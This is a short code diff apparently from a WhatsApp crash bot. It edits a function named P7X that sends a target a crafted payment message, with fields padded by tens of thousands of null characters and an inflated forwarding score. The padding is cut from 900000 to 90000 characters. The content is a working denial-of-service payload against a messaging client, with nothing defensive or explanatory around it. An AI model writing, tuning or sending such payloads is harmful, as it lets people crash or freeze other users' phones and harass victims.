@@ -4272,11 +4272,11 @@ async function P7X(sock, target) {
         },
         nativeFlowResponseMessage: {
           name: "payment_method",
-                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(900000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
+                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(90000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
           version: 3
         },
         contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u00000".repeat(900000),
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
           isForwarded: true,
           forwardingScore: 9999,
           statusAttributionType: 3,
